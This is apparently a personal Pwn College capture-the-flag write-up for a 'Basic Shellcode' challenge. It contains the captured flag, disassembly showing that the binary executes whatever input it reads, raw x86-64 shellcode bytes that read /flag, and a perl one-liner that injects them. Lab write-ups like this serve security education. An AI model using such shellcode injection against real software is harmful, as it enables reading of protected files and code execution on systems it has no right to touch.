---
Platform: Pwn College
Tittle: Basic Shellcode
Date & Tme: 2026 - 09 - 07 09:36
tags:
  - Challenge
  - BinaryExploitation
  - ShellcodeInjection
---
---
## FLAG : `pwn.college{wRJBJgavA7oZRSxiGeNzp1w0crV.ddTMywiN4kDOyEzW}`

---
## Solution :

File security : 
![[Pasted image 20260907093737.png|324]]

There are Canary, so it will be a little overwhelming to do buffer overflow attack.

Info Functions : 
```shell
0x00000000000012e0  frame_dummy
0x00000000000012e9  print_disassembly
0x0000000000001547  main
```

If we see the disassembly of `main` : 
```asm
   0x00000000000017d5 <+654>:	mov    rax,QWORD PTR [rip+0x285c]        # 0x4038 <shellcode>
   0x00000000000017dc <+661>:	mov    rdx,rax
   0x00000000000017df <+664>:	mov    eax,0x0
   0x00000000000017e4 <+669>:	call   rdx
```

It will call something from `rdx` register, and if we see the `read` section : 
```asm
   0x000000000000174d <+518>:	mov    rax,QWORD PTR [rip+0x28e4]        # 0x4038 <shellcode>
   0x0000000000001754 <+525>:	mov    edx,0x1000
   0x0000000000001759 <+530>:	mov    rsi,rax
   0x000000000000175c <+533>:	mov    edi,0x0
   0x0000000000001761 <+538>:	call   0x11b0 <read@plt>
```

We could see clearly, that this program will execute anything we put into the buffer.
Our plan is to put a shellcode that could read `/flag` and print it out to screen. 

Shellcode : 
```shell
\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00
```
*Note : Use \x00 in the end of file name*.

Payload : 
```shell
perl -e 'print "\xeb\x2f\x5f\x6a\x02\x58\x48\x31\xf6\x0f\x05\x66\x81\xec\xef\x0f\x48\x8d\x34\x24\x48\x97\x48\x31\xd2\x66\xba\xef\x0f\x48\x31\xc0\x0f\x05\x6a\x01\x5f\x48\x92\x6a\x01\x58\x0f\x05\x6a\x3c\x58\x0f\x05\xe8\xcc\xff\xff\xff\x2f\x66\x6c\x61\x67\x00"' | /challenge/binary-exploitation-basic-shellcode
```

---
### Key Takeaways : 

